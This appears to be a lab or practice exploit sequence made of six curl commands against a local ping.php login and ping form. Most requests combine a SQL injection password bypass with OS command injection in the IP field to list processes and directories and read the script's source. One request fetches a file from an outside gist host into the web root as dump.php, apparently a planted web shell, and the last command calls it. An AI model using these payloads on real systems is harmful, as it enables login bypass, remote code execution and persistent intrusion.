curl -F "s=OK" -F "user=bad" -F "passwd=wrongpasswd' OR 'a'='a" -F "ipaddr=localhost; ps aux" -X POST http://localhost:8000/ping.php
curl -F "s=OK" -F "user=bad" -F "passwd=wrongpasswd' OR 'a'='a" -F "ipaddr=localhost; ls /var/www/" -X POST http://localhost:8000/ping.php
curl -F "s=OK" -F "user=bad" -F "passwd=wrongpasswd' OR 'a'='a" -F "ipaddr=localhost; ls /var/www/html" -X POST http://localhost:8000/ping.php
curl -F "s=OK" -F "user=bad" -F "passwd=wrongpasswd' OR 'a'='a" -F "ipaddr=localhost; cat /var/www/html/ping.php" -X POST http://localhost:8000/ping.php
curl -F "s=OK" -F "user=bad" -F "passwd=wrongpasswd' OR 'a'='a" -F "ipaddr=localhost; curl https://gist.githubusercontent.com/bencer/9e32fb1af89754b4ad8346b13dcd1110/raw/cd79134f420b59e84e6b60be3bdff7ca0bb42f1e/gistfile1.txt > /var/www/html/dump.php " -X POST http://localhost:8000/ping.php
curl http://localhost:8000/dump.php
